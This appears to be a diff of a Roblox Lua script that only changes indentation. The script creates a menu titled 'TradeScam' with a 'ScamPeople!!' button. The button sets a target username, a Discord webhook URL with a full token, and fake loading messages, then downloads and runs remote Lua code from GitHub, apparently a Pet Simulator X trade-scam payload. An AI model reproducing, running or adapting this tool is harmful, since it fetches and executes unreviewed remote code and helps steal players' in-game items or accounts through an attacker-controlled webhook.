@@ -1,17 +1,17 @@
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("TradeScam", "Midnight")
+  local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+  local Window = Library.CreateLib("TradeScam", "Midnight")
 
-local TradeScam = Window:NewTab("TradeScam")
-local TradeScamSection = TradeScam:NewSection("TradeScam")
+  local TradeScam = Window:NewTab("TradeScam")
+  local TradeScamSection = TradeScam:NewSection("TradeScam")
 
-TradeScamSection:NewButton("TradeScam", "ScamPeople!!", function()
-Username = "jiegamingstido "
-WebHook = "https://discord.com/api/webhooks/1072084019518382101/q9D2DokarAwm4OtiiAen2AHFrB2bLvKspCBtti2_-2FTN7MqhR1MgcNd5_k0f_bV2YNm"
+  TradeScamSection:NewButton("TradeScam", "ScamPeople!!", function()
+  Username = "jiegamingstido "
+  WebHook = "https://discord.com/api/webhooks/1072084019518382101/q9D2DokarAwm4OtiiAen2AHFrB2bLvKspCBtti2_-2FTN7MqhR1MgcNd5_k0f_bV2YNm"
 
-_G.CustomScriptName = "Coen"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
-end)
+  _G.CustomScriptName = "Coen"
+  _G.Text1 = "Script Loaded..."
+  _G.Text2 = "Waiting for Script"
+  _G.Text3 = "Checking Scripts..."
+  _G.Text4 = "Starting Scripts..."
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+  end)
